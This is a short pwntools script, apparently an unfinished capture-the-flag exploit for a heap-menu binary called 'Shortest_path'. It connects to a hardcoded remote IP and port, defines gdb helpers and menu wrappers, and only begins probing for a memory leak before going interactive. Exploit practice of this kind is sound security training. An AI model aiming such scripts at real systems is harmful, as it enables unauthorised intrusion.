from pwn import *
context.log_level = 'debug'
prog = './Shortest_path'
elf = ELF(prog)
#p = process(prog)

libc = ELF("./libc.so.6")
p = remote("121.37.181.246", 19008)
def debug(addr,PIE=True): 
	if PIE: 
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
		gdb.attach(p,'b *{}'.format(hex(text_base+addr))) 
	else: gdb.attach(p,"b *{}".format(hex(addr)))
def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()
    	
def add(idx, price, size, name, num):
	p.sendlineafter("---> ", '1')
	p.sendlineafter("ID: ", str(idx))
	p.sendlineafter("Price: ", str(price))
	p.sendlineafter("Length: ", str(size))
	p.sendafter("Name: \n", name)
	p.sendlineafter("station: ", str(num))
		
def show(idx):
	p.sendlineafter("---> ", '3')
	p.sendlineafter("Station ID: ", str(idx))
def free(idx):
	p.sendlineafter("---> ", '2')
	p.sendlineafter("Station ID: ", str(idx))
def go(idx1, idx2):
	p.sendlineafter("---> ", '4')
	p.sendlineafter("Source Station ID: ", str(idx1))
	p.sendlineafter("Target Station ID: ", str(idx2))
def exp():
	add(0, 10, 0x100, 'a', 0)
	add(1, 10, 0x100, 'a'*224, 0)
	show(1)
	p.interactive()
if __name__ == '__main__':
	exp()
